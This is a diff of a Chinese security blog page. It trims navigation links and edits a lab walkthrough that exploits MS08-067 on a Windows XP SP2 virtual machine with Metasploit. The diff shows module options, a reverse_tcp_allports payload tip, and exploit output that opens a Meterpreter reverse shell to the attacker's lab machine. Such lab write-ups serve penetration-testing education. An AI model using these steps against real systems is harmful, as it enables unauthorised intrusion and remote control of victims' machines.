@@ -64,8 +64,6 @@
                 
                     <a class="menu-item" href="/links">Friends</a>
                 
-                    <a class="menu-item" href="/about">About</a>
-                
                 <input id="switch_default" type="checkbox" class="switch_default">
                 <label for="switch_default" class="toggleBtn"></label>
             </div>
@@ -90,8 +88,6 @@
                     <a class="menu-item" href="/tags">Tags</a>
                 
                     <a class="menu-item" href="/links">Friends</a>
-                
-                    <a class="menu-item" href="/about">About</a>
                 
             </div>
         </div>
@@ -229,12 +225,15 @@
 <p>我们指定操作系统类型为Windows XP SP2 Chinese - Simplified (NX)，NX即为’No Execute’，表示windows启用了<a href="https://www.dell.com/support/article/zh-cn/sln288643/%E4%BB%80%E4%B9%88%E6%98%AF%E6%95%B0%E6%8D%AE%E6%89%A7%E8%A1%8C%E4%BF%9D%E6%8A%A4-dep?lang=zh" target="_blank" rel="noopener">DEP保护</a>，在Windows XP SP2中，DEP默认是启用的</p>
 <p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153331.png" alt=""></p>
 <p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153350.png" alt=""></p>
-<p>通过set RHOST命令设置目标靶机IP地址，set LHOST设置反向连接地址为攻击机IP，set LPORT设置攻击机监听的TCP端口号，</p>
+<p>通过<code>set RHOST</code>命令设置目标靶机IP地址，<code>set LHOST</code>设置反向连接地址为攻击机IP，<code>set LPORT</code>设置攻击机监听的TCP端口号，</p>
 <p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726153946.png" alt=""></p>
-<p>最后输入show options确认这些参数都设置正确</p>
+<p>如果不确定哪个tcp端口能够成功连接，可以使用msf内置的模块施行暴力猜接，使用<code>search reverse_tcp_allports</code>搜索</p>
+<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200726164849.png" alt=""></p>
+<p>再<code>set payload windows/meterpreter/reverse_tcp_allports</code>即可，不过要注意最后执行攻击的时候是<code>exploit -j</code></p>
+<p>最后输入<code>show options</code>确认这些参数都设置正确</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOSTS   192.168.48.134   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT    445              yes       The SMB service port (TCP)</span><br><span class="line">   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.48.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     8080             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   10  Windows XP SP2 Chinese - Simplified (NX)</span><br></pre></td></tr></table></figure>
 
-<p>输入exploit初始化攻击环境并开始攻击</p>
+<p>输入<code>exploit</code>初始化攻击环境并开始攻击</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(windows&#x2F;smb&#x2F;ms08_067_netapi) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.48.128:8080 </span><br><span class="line">[*] 192.168.48.134:445 - Attempting to trigger the vulnerability...</span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.48.134</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.48.128:8080 -&gt; 192.168.48.134:1055) at 2020-07-26 03:42:03 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 
 <p>可以看到这次攻击是成功的，它为我们返回了一个reverse_tcp方式的Metasploit攻击载荷会话，此时可以使用<code>sessions &lt;ID&gt;</code>命令查看远程运行的Meterpreter情况</p>
